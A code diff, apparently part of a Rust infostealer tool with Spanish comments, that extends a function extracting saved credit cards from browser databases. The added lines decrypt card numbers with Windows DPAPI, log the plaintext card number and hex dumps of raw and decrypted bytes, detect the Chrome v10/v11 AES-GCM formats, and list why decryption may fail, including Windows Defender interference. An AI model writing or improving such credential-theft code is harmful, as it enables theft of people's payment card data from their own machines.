@@ -327,6 +327,29 @@ fn extract_credit_cards(db_path: &PathBuf, browser_name: &str) -> Vec<CreditCard
                     let _ = writeln!(f, "      Nombre: {}", name);
                     let _ = writeln!(f, "      Exp: {}/{}", exp_month, exp_year);
                     let _ = writeln!(f, "      Encrypted bytes: {}", encrypted_number.len());
+                    
+                    // Mostrar primeros bytes en hexadecimal para diagnóstico
+                    if encrypted_number.len() > 0 {
+                        let preview_len = std::cmp::min(20, encrypted_number.len());
+                        let _ = write!(f, "      Primeros bytes (hex): ");
+                        for i in 0..preview_len {
+                            let _ = write!(f, "{:02X} ", encrypted_number[i]);
+                        }
+                        let _ = writeln!(f, "");
+                        
+                        // Verificar formato (v10/v11 = AES-GCM, sin prefijo = DPAPI directo)
+                        if encrypted_number.len() >= 3 {
+                            if &encrypted_number[0..3] == b"v10" {
+                                let _ = writeln!(f, "      ⚠️ Formato: v10 (AES-256-GCM) - Necesita master key");
+                            } else if &encrypted_number[0..3] == b"v11" {
+                                let _ = writeln!(f, "      ⚠️ Formato: v11 (AES-256-GCM) - Necesita master key");
+                            } else if &encrypted_number[0..5] == b"DPAPI" {
+                                let _ = writeln!(f, "      ℹ️ Formato: DPAPI con prefijo");
+                            } else {
+                                let _ = writeln!(f, "      ℹ️ Formato: DPAPI directo (raw bytes)");
+                            }
+                        }
+                    }
                 }
                 
                 // Desencriptar número de tarjeta con DPAPI
@@ -334,12 +357,22 @@ fn extract_credit_cards(db_path: &PathBuf, browser_name: &str) -> Vec<CreditCard
                     if let Some(ref mut f) = log {
                         use std::io::Write;
                         let _ = writeln!(f, "      ✅ DPAPI decrypt OK, bytes: {}", decrypted.len());
+                        
+                        // Mostrar bytes desencriptados
+                        if decrypted.len() > 0 {
+                            let preview_len = std::cmp::min(30, decrypted.len());
+                            let _ = write!(f, "      Decrypted bytes (hex): ");
+                            for i in 0..preview_len {
+                                let _ = write!(f, "{:02X} ", decrypted[i]);
+                            }
+                            let _ = writeln!(f, "");
+                        }
                     }
                     
-                    if let Ok(card_number) = String::from_utf8(decrypted) {
+                    if let Ok(card_number) = String::from_utf8(decrypted.clone()) {
                         if let Some(ref mut f) = log {
                             use std::io::Write;
-                            let _ = writeln!(f, "      ✅ UTF8 conversion OK");
+                            let _ = writeln!(f, "      ✅ UTF8 conversion OK: '{}'", card_number.replace(char::is_whitespace, ""));
                         }
                         
                         // Obtener dirección de billing si existe
@@ -366,13 +399,18 @@ fn extract_credit_cards(db_path: &PathBuf, browser_name: &str) -> Vec<CreditCard
                     } else {
                         if let Some(ref mut f) = log {
                             use std::io::Write;
-                            let _ = writeln!(f, "      ❌ UTF8 conversion failed");
+                            let _ = writeln!(f, "      ❌ UTF8 conversion failed - Bytes desencriptados no son texto válido");
                         }
                     }
                 } else {
                     if let Some(ref mut f) = log {
                         use std::io::Write;
-                        let _ = writeln!(f, "      ❌ DPAPI decrypt failed");
+                        let _ = writeln!(f, "      ❌ DPAPI decrypt failed - CryptUnprotectData retornó error");
+                        let _ = writeln!(f, "      💡 Posibles causas:");
+                        let _ = writeln!(f, "         - Windows Defender bloqueando DPAPI");
+                        let _ = writeln!(f, "         - Diferente usuario encriptó los datos");
+                        let _ = writeln!(f, "         - Tarjeta protegida por Microsoft Account");
+                        let _ = writeln!(f, "         - Formato v10/v11 (AES-GCM) requiere master key");
                     }
                 }
             } else {
